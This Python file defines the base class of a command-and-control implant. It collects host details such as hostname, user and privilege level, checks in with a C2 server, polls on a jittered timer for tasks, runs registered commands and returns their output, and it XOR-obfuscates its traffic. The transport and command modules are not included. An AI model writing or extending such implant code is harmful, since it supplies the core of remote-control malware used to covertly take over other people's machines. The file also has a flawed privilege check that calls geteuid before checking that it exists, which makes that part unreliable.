import asyncio
import json
import os
import sys
import base64
import random
import string
import time
import uuid
from typing import Dict, List, Tuple, Optional

# Custom encryption can be added here for communication obfuscation
class Crypto:
    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        # Simple XOR encryption for demonstration
        result = bytearray()
        for i in range(len(data)):
            result.append(data[i] ^ key[i % len(key)])
        return bytes(result)
    
    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        # XOR decryption (same operation as encryption)
        return Crypto.encrypt(data, key)

class AgentMessage:
    def __init__(self, message_type: str, data: dict):
        self.message_type = message_type
        self.data = data
        self.uuid = str(uuid.uuid4())
        self.timestamp = int(time.time())
    
    def to_json(self) -> str:
        return json.dumps({
            "type": self.message_type,
            "data": self.data,
            "uuid": self.uuid,
            "timestamp": self.timestamp
        })
    
    @classmethod
    def from_json(cls, json_str: str) -> 'AgentMessage':
        data = json.loads(json_str)
        msg = cls(data["type"], data["data"])
        msg.uuid = data["uuid"]
        msg.timestamp = data["timestamp"]
        return msg

class BaseAgent:
    def __init__(self):
        # Agent configuration
        self.uuid = str(uuid.uuid4())
        self.hostname = os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', 'unknown')
        self.username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
        self.pid = os.getpid()
        self.os = sys.platform
        
        # C2 profile configuration will be loaded from c2_profiles
        self.c2_profile = None
        self.encryption_key = os.urandom(16)  # Generate random encryption key
        self.commands = {}
        self.checkin_interval = 10  # seconds
        self.jitter = 0.2  # 20% jitter
        self.is_running = False
        
    def register_command(self, command_name: str, command_function):
        """Register a command handler function"""
        self.commands[command_name] = command_function
    
    def get_checkin_data(self) -> dict:
        """Generate initial checkin data for the agent"""
        return {
            "uuid": self.uuid,
            "hostname": self.hostname,
            "username": self.username,
            "pid": self.pid,
            "os": self.os,
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "integrity_level": "high" if os.geteuid() == 0 else "medium" if hasattr(os, 'geteuid') else "unknown"
        }
    
    async def handle_command(self, command_data: dict) -> dict:
        """Process incoming command from the C2"""
        command_name = command_data.get("command")
        
        if command_name not in self.commands:
            return {
                "status": "error",
                "output": f"Command {command_name} not implemented"
            }
        
        try:
            result = await self.commands[command_name](command_data)
            return {
                "status": "success",
                "output": result
            }
        except Exception as e:
            return {
                "status": "error",
                "output": f"Error executing {command_name}: {str(e)}"
            }
    
    async def checkin(self):
        """Initial checkin with C2 server"""
        if not self.c2_profile:
            raise ValueError("C2 profile not configured")
        
        checkin_data = self.get_checkin_data()
        message = AgentMessage("checkin", checkin_data)
        response = await self.c2_profile.send_message(message.to_json())
        
        if response:
            try:
                response_data = json.loads(response)
                return response_data.get("status") == "success"
            except:
                return False
        return False
    
    async def message_loop(self):
        """Main agent message loop"""
        self.is_running = True
        
        while self.is_running:
            try:
                # Get any waiting tasks from the C2
                message = AgentMessage("get_tasking", {"uuid": self.uuid})
                response = await self.c2_profile.send_message(message.to_json())
                
                if response:
                    try:
                        response_data = json.loads(response)
                        tasks = response_data.get("tasks", [])
                        
                        for task in tasks:
                            # Execute the command
                            result = await self.handle_command(task)
                            
                            # Send the result back
                            result_message = AgentMessage("task_result", {
                                "task_id": task.get("id"),
                                "result": result
                            })
                            await self.c2_profile.send_message(result_message.to_json())
                    except Exception as e:
                        print(f"Error processing tasks: {str(e)}")
            except Exception as e:
                print(f"Error in message loop: {str(e)}")
            
            # Sleep with jitter
            sleep_time = self.checkin_interval * (1 + random.uniform(-self.jitter, self.jitter))
            await asyncio.sleep(sleep_time)
    
    def set_c2_profile(self, profile):
        """Set the C2 profile for this agent"""
        self.c2_profile = profile
    
    async def start(self):
        """Start the agent"""
        # Initial checkin
        if await self.checkin():
            # Start the main message loop
            await self.message_loop()
        else:
            print("Failed to check in with C2 server")
    
    def stop(self):
        """Stop the agent"""
        self.is_running = False